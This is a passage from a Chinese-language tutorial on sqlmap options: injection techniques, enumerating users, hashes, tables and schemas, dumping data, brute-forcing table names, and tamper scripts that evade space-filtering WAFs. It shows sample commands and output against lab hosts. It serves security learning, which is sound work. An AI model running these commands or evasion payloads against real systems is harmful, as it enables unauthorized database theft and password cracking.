<p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p>
<h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><p><strong>测试是否是注入</strong></p>
<p>参数：<code>–technique</code></p>
<p>这个参数可以指定<code>sqlmap</code>使用的探测技术，默认情况下会测试所有的方式。</p>
<p>支持的探测方式如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">B: <span class="type">Boolean</span>-based blind <span class="keyword">SQL</span> injection（布尔型注入）</span><br><span class="line"></span><br><span class="line">E: Error-based <span class="keyword">SQL</span> injection（报错型注入）</span><br><span class="line"></span><br><span class="line">U: <span class="keyword">UNION</span> query <span class="keyword">SQL</span> injection（可联合查询注入）</span><br><span class="line"></span><br><span class="line">S: <span class="keyword">Stacked</span> queries <span class="keyword">SQL</span> injection（可多语句查询注入）</span><br><span class="line"></span><br><span class="line">T: <span class="type">Time</span>-based blind <span class="keyword">SQL</span> injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>
<p><strong>设定延迟注入的时间</strong></p>
<p>参数：<code>–time-sec</code></p>
<p>当使用继续时间的盲注时，时刻使用<code>–time-sec</code>参数设定延时时间，默认是5秒。</p>
<p><strong>设定UNION查询字段数</strong></p>
<p>参数：<code>–union-cols</code></p>
<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。</p>
<p>设定<code>–union-cols</code>的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
<p><strong>设定UNION查询使用的字符</strong></p>
<p>参数：<code>–union-char</code></p>
<p>默认情况下<code>sqlmap</code>针对<code>UNION</code>查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，</p>
<p>这是你可以用<code>–union-char</code>只定UNION查询的字符。</p>
<p><strong>二阶SQL注入</strong></p>
<p>参数：<code>–second-order</code></p>
<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。</p>
<p><code>–second-order</code>后面跟一个判断页面的URL地址。</p>
<p><strong>列数据</strong></p>
<p>参数：<code>-b,–banner</code></p>
<p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。</p>
<p><strong>用户</strong></p>
<p>参数：<code>-current-user</code></p>
<p>在大多数据库中可以获取到管理数据的用户。</p>
<p><strong>当前数据库</strong></p>
<p>参数：<code>–current-db</code></p>
<p>返还当前连接的数据库。</p>
<p><strong>当前用户是否为管理用</strong></p>
<p>参数：<code>–is-dba</code></p>
<p>判断当前的用户是否为管理，是的话会返回True。</p>
<p><strong>列数据库管理用户</strong></p>
<p>参数：<code>–users</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
<p><strong>列出并破解数据库用户的hash</strong></p>
<p>参数：<code>–passwords</code></p>
<p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://********/sqlmap/pgsql/get_int.php?id=1&quot;</span> --passwords -v <span class="number">1</span></span><br><span class="line">[...]</span><br><span class="line">back-end <span class="symbol">DBMS</span>: <span class="symbol">PostgreSQL</span></span><br><span class="line">[hh:mm:<span class="number">38</span>] [<span class="symbol">INFO</span>] fetching database users password hashes</span><br><span class="line">do you want to use dictionary attack on retrieved password hashes? [<span class="symbol">Y</span>/n/q] y</span><br><span class="line">[hh:mm:<span class="number">42</span>] [<span class="symbol">INFO</span>] using hash method: <span class="string">&#x27;postgres_passwd&#x27;</span></span><br><span class="line">what<span class="string">&#x27;s the dictionary&#x27;</span>s location? [/software/sqlmap/txt/wordlist.txt]</span><br><span class="line">[hh:mm:<span class="number">46</span>] [<span class="symbol">INFO</span>] loading dictionary from: <span class="string">&#x27;/software/sqlmap/txt/wordlist.txt&#x27;</span></span><br><span class="line">do you want to use common password suffixes? (slow!) [y/<span class="symbol">N</span>] n</span><br><span class="line">[hh:mm:<span class="number">48</span>] [<span class="symbol">INFO</span>] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:<span class="number">49</span>] [<span class="symbol">INFO</span>] found: <span class="string">&#x27;testpass&#x27;</span> for user: <span class="string">&#x27;testuser&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [<span class="symbol">INFO</span>] found: <span class="string">&#x27;testpass&#x27;</span> for user: <span class="string">&#x27;postgres&#x27;</span></span><br><span class="line">database management system users password hashes:</span><br><span class="line">[*] postgres [<span class="number">1</span>]:</span><br><span class="line">password hash: md5d7d880f96044b72d0bba108ace96d1e4</span><br><span class="line">clear-text password: testpass</span><br><span class="line">[*] testuser [<span class="number">1</span>]:</span><br><span class="line">password hash: md599e5ea7a6f7c3269995cba3927fd0093</span><br><span class="line">clear-text password: testpass</span><br></pre></td></tr></table></figure>
<p>可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，</p>
<p>这个爆破已经支持<code>Oracle</code>和<code>Microsoft SQL Server</code>。</p>
<p>也可以提供-U参数来指定爆破哪个用户的<code>hash</code>。</p>
<p><strong>列出数据库管理员权限</strong></p>
<p>参数：<code>–privileges</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。</p>
<p>也可以用-U参数指定你想看哪个用户的权限。</p>
<p><strong>列出数据库管理员角色</strong></p>
<p>参数：<code>–roles</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。</p>
<p>仅适用于当前数据库是<code>Oracle</code>的时候。</p>
<p><strong>列出数据库系统的数据库</strong></p>
<p>参数：<code>–dbs</code></p>
<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
<p><strong>列举数据库表</strong></p>
<p>参数：<code>–tables,–exclude-sysdbs,-D</code></p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.163.138/mutillidae/index.php?page=user-info.php&amp;username=111&amp;password=12123&amp;user-info-php-submit-button=View+Account+Details&quot;</span></span><br><span class="line"><span class="comment">--tables -D dvwa</span></span><br></pre></td></tr></table></figure>
<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
<p>–exclude-sysdbs参数是指包含了所有的系统数据库。</p>
<p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p>
<p><strong>列举数据库表中的字段</strong></p>
<p>参数：<code>–columns,-C,-T,-D</code></p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://<span class="strong">*****</span>**/sqlmap/sqlite/get_int.php?id=1&quot; --columns -D testdb -T users -C name</span><br><span class="line"><span class="meta">[...]</span></span><br><span class="line">Database: SQLite_masterdb</span><br><span class="line">Table: users</span><br><span class="line"><span class="meta">[3 columns]</span></span><br><span class="line"><span class="code">+---------+</span>---------+</span><br><span class="line">| Column  | Type|</span><br><span class="line"><span class="code">+---------+</span>---------+</span><br><span class="line">| id  | INTEGER |</span><br><span class="line">| name| TEXT|</span><br><span class="line">| surname | TEXT|</span><br><span class="line"><span class="code">+---------+</span>---------+</span><br></pre></td></tr></table></figure>
<p><strong>列举数据库系统的架构</strong></p>
<p>参数：<code>–schema,–exclude-sysdbs</code></p>
<p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p>
<p>加上<code>–exclude-sysdbs</code>参数，将不会获取数据库自带的系统库内容。</p>
<p>MySQL例子：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://<span class="strong">*****</span>**/sqlmap/mysql/get_int.php?id=1&quot; --schema --batch --exclude-sysdbs</span><br><span class="line"><span class="meta">[...]</span></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: accounts</span><br><span class="line"><span class="meta">[4 columns]</span></span><br><span class="line"><span class="code">+-------------+</span>---------+</span><br><span class="line">| Column  | Type|</span><br><span class="line"><span class="code">+-------------+</span>---------+</span><br><span class="line">| cid | int(11) |</span><br><span class="line">| mysignature | text|</span><br><span class="line">| password| text|</span><br><span class="line">| username| text|</span><br><span class="line"><span class="code">+-------------+</span>---------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: blogs_table</span><br><span class="line"><span class="meta">[4 columns]</span></span><br><span class="line"><span class="code">+--------------+</span>----------+</span><br><span class="line">| Column   | Type |</span><br><span class="line"><span class="code">+--------------+</span>----------+</span><br><span class="line">| date | datetime |</span><br><span class="line">| blogger_name | text |</span><br><span class="line">| cid  | int(11)  |</span><br><span class="line">| comment  | text |</span><br><span class="line"><span class="code">+--------------+</span>----------+</span><br><span class="line"></span><br><span class="line">Database: owasp10</span><br><span class="line">Table: hitlog</span><br><span class="line"><span class="meta">[6 columns]</span></span><br><span class="line"><span class="code">+----------+</span>----------+</span><br><span class="line">| Column   | Type |</span><br><span class="line"><span class="code">+----------+</span>----------+</span><br><span class="line">| date | datetime |</span><br><span class="line">| browser  | text |</span><br><span class="line">| cid  | int(11)  |</span><br><span class="line">| hostname | text |</span><br><span class="line">| ip   | text |</span><br><span class="line">| referer  | text |</span><br><span class="line"><span class="code">+----------+</span>----------+</span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line">Table: users</span><br><span class="line"><span class="meta">[3 columns]</span></span><br><span class="line"><span class="code">+---------+</span>---------------+</span><br><span class="line">| Column  | Type  |</span><br><span class="line"><span class="code">+---------+</span>---------------+</span><br><span class="line">| id  | int(11)   |</span><br><span class="line">| name| varchar(500)  |</span><br><span class="line">| surname | varchar(1000) |</span><br><span class="line"><span class="code">+---------+</span>---------------+</span><br><span class="line"><span class="meta">[...]</span></span><br></pre></td></tr></table></figure>
<p><strong>获取表中数据个数</strong></p>
<p>参数：<code>–count</code></p>
<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
<p>列举一个<code>Microsoft SQL Server</code>例子：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;</span> --count -D testdb</span><br><span class="line">[...]</span><br><span class="line">Database: testdb</span><br><span class="line">+----------------+---------+</span><br><span class="line">|<span class="string"> Table  </span>|<span class="string"> Entries </span>|</span><br><span class="line">+----------------+---------+</span><br><span class="line">|<span class="string"> dbo.users  </span>|<span class="string"> 4   </span>|</span><br><span class="line">|<span class="string"> dbo.users_blob </span>|<span class="string"> 2   </span>|</span><br><span class="line">+----------------+---------+</span><br></pre></td></tr></table></figure>
<p><strong>获取整个表的数据</strong></p>
<p>参数：<code>–dump,-C,-T,-D,–start,–stop,–first,–last</code></p>
<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</p>
<p>使用<code>-D,-T</code>参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。</p>
<p>列举一个<code>Firebird</code>的例子：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot; --dump -T users</span><br><span class="line"><span class="meta">[...]</span></span><br><span class="line">Database: Firebird_masterdb</span><br><span class="line">Table: USERS</span><br><span class="line"><span class="meta">[4 entries]</span></span><br><span class="line"><span class="code">+----+</span>--------<span class="code">+------------+</span></span><br><span class="line">| ID | NAME   | SURNAME|</span><br><span class="line"><span class="code">+----+</span>--------<span class="code">+------------+</span></span><br><span class="line">| 1  | luther | blisset|</span><br><span class="line">| 2  | fluffy | bunny  |</span><br><span class="line">| 3  | wu | ming   |</span><br><span class="line">| 4  | NULL   | nameisnull |</span><br><span class="line"><span class="code">+----+</span>--------<span class="code">+------------+</span></span><br></pre></td></tr></table></figure>
<p>可以获取指定库中的所有表的内容，只用<code>-dump</code>跟<code>-D</code>参数（不使用-T与-C参数）。</p>
<p>也可以用-dump跟-C获取指定的字段内容。</p>
<p>sqlmap为每个表生成了一个CSV文件。</p>
<p>如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop</p>
<p>1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。</p>
<p><img src="https://img.npfs06.top/20210326210503.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>也可以用<code>–first与–last</code>参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first</p>
<p>3:–last</p>
<p>4:只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p>
<p><strong>获取所有数据库表的内容</strong></p>
<p>参数：<code>–dump-all,–exclude-sysdbs</code></p>
<p>使用<code>–dump-all</code>参数获取所有数据库表的内容，可同时加上<code>–exclude-sysdbs</code>只获取用户数据库的表，</p>
<p>需要注意在<code>Microsoft SQL</code><br><code>Server</code>中<code>master</code>数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p>
<p><strong>搜索字段，表，数据库</strong></p>
<p>参数：<code>–search,-C,-T,-D</code></p>
<p><code>–search</code>可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p>
<p>可以在一下三种情况下使用：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</span></span><br></pre></td></tr></table></figure>
<p><strong>运行自定义的SQL语句</strong></p>
<p>参数：<code>–sql-query,–sql-shell</code></p>
<p><code>sqlmap</code>会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p>
<p>如果是<code>SELECT</code>查询语句，<code>sqlap</code>将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p>
<p>列举一个<code>Mircrosoft SQL Server 2000</code>的例子：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">$ python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://**********/sqlmap/mssql/get_int.php?id=1&quot;</span></span><br><span class="line">--sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v <span class="number">1</span></span><br><span class="line"><span class="selector-attr">[...]</span></span><br><span class="line"><span class="selector-attr">[hh:mm:14]</span> <span class="selector-attr">[INFO]</span> fetching SQL SELECT query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="selector-attr">[hh:mm:14]</span> <span class="selector-attr">[INFO]</span> retrieved: foo</span><br><span class="line">SELECT <span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;foo&#x27;</span></span><br><span class="line">\$ python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span></span><br><span class="line">--sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;, &#x27;bar&#x27;&quot;</span> -v <span class="number">2</span></span><br><span class="line"><span class="selector-attr">[...]</span></span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> fetching SQL SELECT query output: <span class="string">&#x27;SELECT &#x27;</span>foo<span class="string">&#x27;, &#x27;</span>bar<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> the SQL query provided has more than <span class="selector-tag">a</span> field. sqlmap will now</span><br><span class="line">unpack it into</span><br><span class="line">distinct queries to be able to retrieve the output even <span class="keyword">if</span> we are going blind</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> query: SELECT ISNULL(CAST((CHAR(<span class="number">102</span>)+CHAR(<span class="number">111</span>)+CHAR(<span class="number">111</span>)) AS</span><br><span class="line"><span class="function"><span class="title">VARCHAR</span><span class="params">(<span class="number">8000</span>)</span></span>),</span><br><span class="line">(CHAR(<span class="number">32</span>)))</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> retrieved: foo</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> query: SELECT ISNULL(CAST((CHAR(<span class="number">98</span>)+CHAR(<span class="number">97</span>)+CHAR(<span class="number">114</span>)) AS</span><br><span class="line"><span class="function"><span class="title">VARCHAR</span><span class="params">(<span class="number">8000</span>)</span></span>),</span><br><span class="line">(CHAR(<span class="number">32</span>)))</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[INFO]</span> retrieved: bar</span><br><span class="line"><span class="selector-attr">[hh:mm:50]</span> <span class="selector-attr">[DEBUG]</span> performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</span><br><span class="line">SELECT <span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>: <span class="string">&#x27;foo, bar&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p><strong>暴力破解表名</strong></p>
<p>参数：<code>–common-tables</code></p>
<p>当使用<code>–tables</code>无法获取到数据库的表时，可以使用此参数。</p>
<p>通常是如下情况：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. `MySQL`数据库版本小于<span class="number">5.0</span>，没有`information_schema`表。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 数据库是`Microssoft Access`，系统表`MSysObjects`是不可读的（默认）。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. 当前用户没有权限读取系统中保存数据结构的表的权限。</span><br></pre></td></tr></table></figure>
<p>暴力破解的表在<code>txt/common-tables.txt</code>文件中，你可以自己添加。</p>
<p>列举一个MySQL 4.1的例子：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner</span><br><span class="line"></span><br><span class="line">[<span class="built_in">..</span>.]</span><br><span class="line">[hh:mm:39] [<span class="builtin-name">INFO</span>] testing MySQL</span><br><span class="line">[hh:mm:39] [<span class="builtin-name">INFO</span>] confirming MySQL</span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] fetching banner</span><br><span class="line">web<span class="built_in"> server </span>operating system: Windows</span><br><span class="line">web application technology: PHP 5.3.1, Apache 2.2.14</span><br><span class="line">back-end DBMS operating system: Windows</span><br><span class="line">back-end DBMS: MySQL &lt; 5.0.0</span><br><span class="line">banner:<span class="string">&#x27;4.1.21-community-nt&#x27;</span></span><br><span class="line"></span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] checking table existence using items <span class="keyword">from</span> <span class="string">&#x27;/software/sqlmap/txt/common-tables.txt&#x27;</span></span><br><span class="line">[hh:mm:40] [<span class="builtin-name">INFO</span>] adding words used on web<span class="built_in"> page </span><span class="keyword">to</span> the check list</span><br><span class="line">please enter number of threads? [Enter <span class="keyword">for</span> 1 (current)] 8</span><br><span class="line">[hh:mm:43] [<span class="builtin-name">INFO</span>] retrieved: users</span><br><span class="line"></span><br><span class="line">Database: testdb</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">|<span class="built_in"> users </span>|</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure>
<p><strong>暴力破解列名</strong></p>
<p>参数：<code>–common-columns</code></p>
<p>与暴力破解表名一样，暴力跑的列名在<code>txt/common-columns.txt</code>中。</p>
<p><img src="https://img.npfs06.top/20210326210523.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以选择多线程来尝试破解。</p>
<h1 id="针对过滤空格的："><a href="#针对过滤空格的：" class="headerlink" title="针对过滤空格的："></a>针对过滤空格的：</h1><p><strong>1:space2dash.py</strong></p>
<p>作用：用”– 随机字符串%0A” 替换原来的空格</p>
<p>示例：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br><span class="line">&#x27;1--nVNaVoPYeva%0AAND--ngNvzqu%0A<span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>原理是–n是注释，后面内容不生效，%0A为换行符，这样就可以不使用空格分隔了。</p>
<p>在以下版本做过测试:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MSSQL</span></span><br><span class="line"><span class="attribute">SQLite</span></span><br></pre></td></tr></table></figure>
<p><strong>2:space2hash.py</strong></p>
<p>作用：空格替换为#号 随机字符串 以及换行符</p>
<p>示例：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">AND</span> <span class="number">9227</span>=<span class="number">9227</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cWfcVRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 4.0, 5.0</span><br></pre></td></tr></table></figure>
<p><strong>3: space2morehash.py</strong></p>
<p>作用：空格替换为 #号 以及更多随机字符串 换行符（和上一条原理一致）</p>
<p>示例：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">AND</span> <span class="number">9227</span>=<span class="number">9227</span> </span><br><span class="line"><span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cWfcVRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure>
<p>版本要求: </p>
<ul>
<li>MySQL &gt;= 5.1.13 Tested<br>针对此做过测试: </li>
<li>MySQL 5.1.41</li>
</ul>
<p><strong>space2mssqlblank.py</strong><br>作用：空格替换为其它空符号<br>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users </span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">08</span>id<span class="operator">%</span><span class="number">02</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">0</span>Fusers</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span></span><br><span class="line">在以下版本做过测试:</span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2000</span></span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span></span><br></pre></td></tr></table></figure>
<p><strong>4:space2mysqlblank.py</strong></p>
<p>作用：空格替换其它空白符号</p>
<p>示例：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">SELECT</span> id <span class="meta">FROM</span> users </span><br><span class="line"><span class="meta">SELECT</span>%0Bid%0BFROM<span class="name">%A0users</span></span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 5.1</span><br></pre></td></tr></table></figure>
<p><strong>5:space2mssqlhash.py</strong></p>
<p>作用：替换空格</p>
<p>示例：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br><span class="line">&#x27;1%23%0AAND%23%0A<span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MSSQL</span></span><br><span class="line"><span class="attribute">MySQL</span></span><br></pre></td></tr></table></figure>
<p><strong>6:modsecurityversioned.py</strong></p>
<p>作用：过滤空格，包含完整的查询版本注释</p>
<p>示例：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;1 AND 2&gt;1--&#x27;</span><br><span class="line">&#x27;1 /*!<span class="number">3087</span>4AND 2&gt;1*/--&#x27;</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 5.0</span><br></pre></td></tr></table></figure>
<p><strong>7:space2comment.py</strong></p>
<p>作用：<code>Replaces space character (‘ ‘) with comments ‘/**/’</code></p>
<p>示例：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">SELECT id FROM users </span><br><span class="line">SELECT<span class="regexp">//i</span>d<span class="regexp">//</span>FROM<span class="regexp">/**/u</span>sers</span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>8:space2mysqldash.py</strong></p>
<p>作用：用<code>–%0A</code>替换空格</p>
<p>注：之前有个<code>mssql</code>的 这个是<code>mysql</code>的</p>
<p>示例：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br><span class="line">&#x27;1--%0AAND--%0A<span class="number">9227</span>=<span class="number">9227</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>版本要求:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MySQL</span></span><br><span class="line"><span class="attribute">MSSQL</span></span><br></pre></td></tr></table></figure>
<p><strong>9:space2plus.py</strong></p>
<p>作用：用+替换空格</p>
<p>示例：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">SELECT</span>+id+<span class="keyword">FROM</span>+users<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<p>All</p>
<p><strong>10:bluecoat.py</strong></p>
<p>作用：代替空格字符后与一个有效的随机空白字符的<code>SQL</code>语句。 然后替换<code>=为like</code></p>
<p>示例：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">where</span> id = <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">SELECT</span>%<span class="number">09</span>id <span class="keyword">FROM</span> users <span class="keyword">where</span> id <span class="keyword">LIKE</span> <span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在以下版本做过测试:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> <span class="number">5</span>.<span class="number">1</span>, SGOS</span><br></pre></td></tr></table></figure>
<p><strong>11:space2randomblank.py</strong></p>
<p>作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
<p>示例：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">SELECT</span>%<span class="number">0</span>Did%<span class="number">0</span>DFROM%<span class="number">0</span>Ausers<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
